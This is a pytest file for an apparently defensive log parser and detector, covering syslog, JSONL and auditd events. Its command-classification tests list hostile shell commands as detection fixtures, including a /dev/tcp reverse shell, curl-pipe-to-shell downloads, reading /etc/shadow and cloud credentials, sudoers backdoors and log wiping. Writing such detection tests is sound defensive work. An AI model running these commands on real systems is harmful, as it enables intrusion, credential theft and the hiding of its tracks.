"""Parser and daemon-classification tests."""

from __future__ import annotations

import json
from datetime import datetime

import pytest
from conftest import UTC

from argus.ingest.auditd import AuditdParser
from argus.ingest.jsonl import JsonlParser, flatten_json
from argus.ingest.syslog import SyslogParser, derive_command_actions


def parse_syslog(line: str, **kwargs):
    parser = SyslogParser(year=2026, **kwargs)
    return parser.parse_line(line, 1, "test.log")


def test_syslog_rfc3164_with_yearless_timestamp_and_ssh_failure():
    event = parse_syslog(
        "Nov 10 03:04:05 web01 sshd[42]: Failed password for invalid user admin "
        "from 45.155.205.233 port 51422 ssh2"
    )
    assert event is not None
    assert event.timestamp == datetime(2026, 11, 10, 3, 4, 5, tzinfo=UTC)
    assert event.timestamp.tzinfo is UTC
    assert event.fields["host"] == "web01"
    assert event.fields["program"] == "sshd"
    assert event.fields["pid"] == "42"
    assert event.fields["user"] == "admin"
    assert event.fields["src_ip"] == "45.155.205.233"
    assert event.fields["src_port"] == 51422
    assert event.fields["invalid_user"] is True
    assert "ssh_auth_failed" in event.fields["action"]


def test_syslog_rfc3164_with_explicit_year():
    event = parse_syslog(
        "2024 Nov 10 03:04:05 web01 sshd[42]: Accepted password for deploy from 10.0.0.12 port 22 ssh2"
    )
    assert event is not None
    assert event.timestamp.year == 2024
    assert event.fields["action"] == ["ssh_auth_success"]
    assert event.fields["user"] == "deploy"
    assert event.fields["auth_method"] == "password"


def test_syslog_rfc5424():
    event = parse_syslog(
        "<34>1 2026-11-10T03:04:05.123Z web01 sshd 42 ID47 - "
        "Accepted publickey for deploy from 10.0.0.12 port 22 ssh2: ED25519 SHA256:abc"
    )
    assert event is not None
    assert event.timestamp.microsecond == 123000
    assert event.fields["host"] == "web01"
    assert event.fields["program"] == "sshd"
    assert event.fields["pid"] == "42"
    assert event.fields["message_id"] == "ID47"
    assert event.fields["syslog_priority"] == 34
    assert event.fields["syslog_facility"] == 4
    assert event.fields["syslog_severity"] == 2
    assert event.fields["key_type"] == "ED25519"
    assert event.fields["fingerprint"] == "SHA256:abc"


def test_syslog_iso_prefix_and_priority():
    event = parse_syslog("<13>2026-11-10T03:04:05+00:00 web01 systemd[1]: Started nginx.service.")
    assert event is not None
    assert event.fields["syslog_priority"] == 13
    assert event.fields["unit"] == "nginx.service"
    assert event.fields["action"] == ["service_started"]


@pytest.mark.parametrize(
    "line",
    [
        "",
        "not a syslog line",
        "<999>Nov 10 03:04:05 host app: message",
        "Nov 99 03:04:05 host app: invalid date",
        "2026-13-40T99:99:99Z host app: invalid timestamp",
    ],
)
def test_syslog_rejects_malformed_lines(line):
    assert parse_syslog(line) is None


def test_syslog_falls_back_to_generic_message_action():
    event = parse_syslog("Nov 10 03:04:05 web01 example[1]: hello world")
    assert event is not None
    assert event.fields["action"] == ["syslog_message"]
    assert event.fields["message"] == "hello world"


@pytest.mark.parametrize(
    ("line", "actions"),
    [
        ("Failed password for root from 1.2.3.4 port 22 ssh2", {"ssh_auth_failed"}),
        ("Accepted publickey for root from 1.2.3.4 port 22 ssh2", {"ssh_auth_success"}),
        ("Invalid user bob from 1.2.3.4", {"ssh_invalid_user"}),
        (
            "error: maximum authentication attempts exceeded for root from 1.2.3.4 port 22",
            {"ssh_auth_failed", "ssh_max_auth"},
        ),
        ("session opened for user deploy", {"ssh_session_opened"}),
        ("session closed for user deploy", {"ssh_session_closed"}),
        ("Connection closed by 1.2.3.4 port 22", {"ssh_disconnected"}),
    ],
)
def test_ssh_message_classification(line, actions):
    event = parse_syslog(f"Nov 10 03:04:05 web01 sshd[1]: {line}")
    assert event is not None
    assert actions <= set(event.fields["action"])


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("/usr/bin/echo 'x ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/x", "sudoers_change"),
        ("/bin/systemctl stop auditd", "audit_tamper"),
        ("/bin/systemctl stop auditd", "service_stopped"),
        ("/usr/sbin/ufw disable", "firewall_disabled"),
        ("/usr/sbin/iptables -F", "firewall_disabled"),
        ("/usr/bin/truncate -s 0 /var/log/auth.log", "log_cleared"),
        ("/bin/sh -c 'echo x > /etc/cron.d/updater'", "cron_persistence"),
        ("/bin/systemctl enable --now app.timer", "systemd_timer_persistence"),
        ("/bin/systemctl enable --now app.service", "systemd_persistence"),
        ("/bin/sh -c 'echo k >> /home/deploy/.ssh/authorized_keys'", "ssh_key_added"),
        ("/usr/bin/cat /etc/shadow", "shadow_access"),
        ("/usr/bin/cat /home/deploy/.aws/credentials", "secret_file_access"),
        ("/usr/bin/chmod u+s /tmp/x", "suid_change"),
        ("/sbin/insmod /tmp/rootkit.ko", "module_load"),
        ("/usr/bin/apt-get install -y netcat-openbsd", "package_install"),
        ("/bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'", "reverse_shell"),
        ("/bin/sh -c 'unset HISTFILE; rm -f /root/.bash_history'", "history_cleared"),
        ("/usr/bin/sed -i s/a/b/ /etc/pam.d/common-auth", "pam_change"),
        ("/usr/bin/curl -s http://example.net/x.sh | sh", "tool_transfer"),
        ("/sbin/shutdown -h now", "system_shutdown"),
        ("/usr/sbin/usermod -aG sudo svc", "group_member_added"),
        ("/usr/sbin/useradd eviltwin", "user_created"),
        ("/usr/bin/systemctl stop firewalld", "firewall_disabled"),
    ],
)
def test_command_action_derivation(command, expected):
    assert expected in derive_command_actions(command)


def test_sudo_classification_extracts_fields_and_shell_action():
    event = parse_syslog(
        "Nov 10 03:04:05 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; "
        "USER=root ; COMMAND=/bin/bash -c id"
    )
    assert event is not None
    assert event.fields["user"] == "deploy"
    assert event.fields["target_user"] == "root"
    assert event.fields["tty"] == "pts/0"
    assert event.fields["pwd"] == "/home/deploy"
    assert event.fields["command"] == "/bin/bash -c id"
    assert "sudo_command" in event.fields["action"]
    assert "sudo_shell" in event.fields["action"]


def test_su_classification():
    event = parse_syslog("Nov 10 03:04:05 web01 su: Successful su for root by deploy")
    assert event is not None
    assert event.fields["action"] == ["su_success"]
    assert event.fields["user"] == "deploy"
    assert event.fields["target_user"] == "root"


def test_cron_classification():
    event = parse_syslog("Nov 10 03:04:05 web01 cron[1]: (root) CMD (curl -s http://x/x.sh | sh)")
    assert event is not None
    assert event.fields["action"] == ["cron_command"]
    assert event.fields["user"] == "root"
    assert event.fields["command"] == "curl -s http://x/x.sh | sh"


def test_systemd_security_service_classification():
    event = parse_syslog("Nov 10 03:04:05 web01 systemd[1]: Stopped auditd.service.")
    assert event is not None
    assert event.fields["unit"] == "auditd.service"
    assert "service_stopped" in event.fields["action"]
    assert "audit_tamper" in event.fields["action"]


def test_account_and_kernel_classification():
    created = parse_syslog(
        "Nov 10 03:04:05 web01 useradd[1]: new user: name=svc-backup, UID=1002, GID=1002, "
        "home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/0"
    )
    assert created is not None
    assert created.fields["action"] == ["user_created"]
    assert created.fields["user"] == "svc-backup"
    usb = parse_syslog(
        "Nov 10 03:04:05 web01 kernel: usb-storage 1-2:1.0: USB Mass Storage device detected"
    )
    assert usb is not None
    assert usb.fields["action"] == ["usb_storage"]


def test_flatten_json_nested_values():
    flat = flatten_json({"a": {"b": 1}, "c": [1, 2], "d": [{"x": 1}], "e": None})
    assert flat["a.b"] == 1
    assert flat["c"] == [1, 2]
    assert flat["d"] == '[{"x":1}]'
    assert flat["e"] is None


def jsonl_event(payload: dict, default_timestamp: datetime | None = None):
    parser = JsonlParser(default_timestamp=default_timestamp or datetime(2026, 11, 10, tzinfo=UTC))
    return parser.parse_line(json.dumps(payload), 1, "app.jsonl")


def test_jsonl_network_and_process_normalization():
    event = jsonl_event(
        {
            "timestamp": "2026-11-10T03:04:05Z",
            "host": "web01",
            "src_ip": "10.0.0.15",
            "dest_ip": "185.220.101.47",
            "dest_port": "4444",
            "bytes_out": "2048",
            "bytes_in": 1024,
            "action": "network_connection",
            "process": {
                "name": "xmrig",
                "executable": "/tmp/xmrig",
                "command_line": "xmrig -o pool",
            },
        }
    )
    assert event is not None
    assert event.fields["dest_scope"] == "public"
    assert event.fields["dest_port"] == 4444
    assert event.fields["bytes_out"] == 2048
    assert event.fields["bytes_in"] == 1024
    assert event.fields["process"] == "xmrig"
    assert event.fields["exe"] == "/tmp/xmrig"
    assert event.fields["command"] == "xmrig -o pool"
    assert event.fields["action"] == ["network_connection"]


def test_jsonl_http_url_and_request_normalization():
    event = jsonl_event(
        {
            "timestamp": "2026-11-10T03:04:05Z",
            "src_ip": "10.0.0.15",
            "url": "https://cdn-sync.example.net/api/v2/telemetry?x=1",
            "method": "post",
            "status": "204",
            "bytes_out": 100,
        }
    )
    assert event is not None
    assert event.fields["dest_host"] == "cdn-sync.example.net"
    assert event.fields["path"] == "/api/v2/telemetry"
    assert event.fields["method"] == "POST"
    assert event.fields["status"] == 204
    assert event.fields["action"] == ["http_request"]

    request_event = jsonl_event(
        {
            "timestamp": 1762743845,
            "request": "GET /index.html HTTP/1.1",
            "host": "web01",
        }
    )
    assert request_event is not None
    assert request_event.fields["method"] == "GET"
    assert request_event.fields["path"] == "/index.html"
    assert request_event.fields["protocol"] == "HTTP/1.1"


def test_jsonl_infers_actions_and_uses_default_timestamp():
    fallback = datetime(2026, 1, 2, 3, 4, 5, tzinfo=UTC)
    network = jsonl_event({"dest_port": 22, "dest_ip": "10.0.0.1"}, fallback)
    assert network is not None
    assert network.timestamp == fallback
    assert network.fields["timestamp_source"] == "file_mtime"
    assert network.fields["action"] == ["network_connection"]
    process = jsonl_event({"process": "xmrig"}, fallback)
    assert process is not None
    assert process.fields["action"] == ["process_start"]
    generic = jsonl_event({"message": "hello"}, fallback)
    assert generic is not None
    assert generic.fields["action"] == ["log_event"]


@pytest.mark.parametrize(
    "line",
    ["", "not json", "[]", '"string"', '{"timestamp": "not-a-time"}'],
)
def test_jsonl_rejects_malformed_lines(line):
    parser = JsonlParser(default_timestamp=datetime(2026, 11, 10, tzinfo=UTC))
    assert parser.parse_line(line, 1, "app.jsonl") is None


def test_jsonl_flattens_dotted_and_list_action_fields():
    event = jsonl_event(
        {
            "timestamp": "2026-11-10T03:04:05Z",
            "event": {"action": ["email_access"], "type": "mail"},
            "user": {"name": "deploy"},
            "host": {"name": "mail01"},
        }
    )
    assert event is not None
    assert event.fields["user"] == "deploy"
    assert event.fields["host"] == "mail01"
    assert event.fields["action"] == ["email_access"]


def audit_event(line: str):
    return AuditdParser().parse_line(line, 1, "audit.log")


def test_auditd_syscall_key_and_user_fields():
    event = audit_event(
        "type=SYSCALL msg=audit(1762743845.123:42): arch=c000003e syscall=90 success=yes "
        'exit=0 a0=75b4 a1=1ff comm="chmod" exe="/usr/bin/chmod" key="suid_change" uid=0'
    )
    assert event is not None
    assert event.timestamp == datetime.fromtimestamp(1762743845.123, tz=UTC)
    assert event.fields["audit_type"] == "SYSCALL"
    assert event.fields["audit_id"] == "42"
    assert event.fields["user"] == "0"
    assert event.fields["process"] == "chmod"
    assert event.fields["exe"] == "/usr/bin/chmod"
    assert event.fields["command"] == "75b4 1ff"
    assert event.fields["action"] == ["suid_change"]


def test_auditd_path_classification_and_hex_decoding():
    shadow = audit_event(
        'type=PATH msg=audit(1762743845.123:43): item=0 name="/etc/shadow" nametype=NORMAL'
    )
    assert shadow is not None
    assert shadow.fields["path"] == "/etc/shadow"
    assert shadow.fields["action"] == ["shadow_access"]

    hex_path = audit_event(
        "type=PATH msg=audit(1762743845.123:44): item=0 name=2F6574632F70616D2E642F636F6D6D6F6E2D61757468"
    )
    assert hex_path is not None
    assert hex_path.fields["path"] == "/etc/pam.d/common-auth"
    assert hex_path.fields["action"] == ["pam_change"]


def test_auditd_execve_arguments_and_derived_actions():
    event = audit_event(
        'type=EXECVE msg=audit(1762743845.123:45): argc=2 a0="cat" a1="/etc/shadow"'
    )
    assert event is not None
    assert event.fields["command"] == "cat /etc/shadow"
    assert event.fields["action"] == ["shadow_access"]


def test_auditd_node_and_daemon_tamper():
    event = audit_event("node=web01 type=DAEMON msg=audit(1762743845.123:46): auditd stopping")
    assert event is not None
    assert event.fields["host"] == "web01"
    assert event.fields["action"] == ["audit_tamper"]


def test_auditd_fallback_action_and_malformed_lines():
    event = audit_event("type=USER_ACCT msg=audit(1762743845.123:47): pid=123 uid=1000")
    assert event is not None
    assert event.fields["action"] == ["audit_event"]
    for line in ("", "no header", "type=BROKEN msg=audit(bad): x"):
        assert audit_event(line) is None
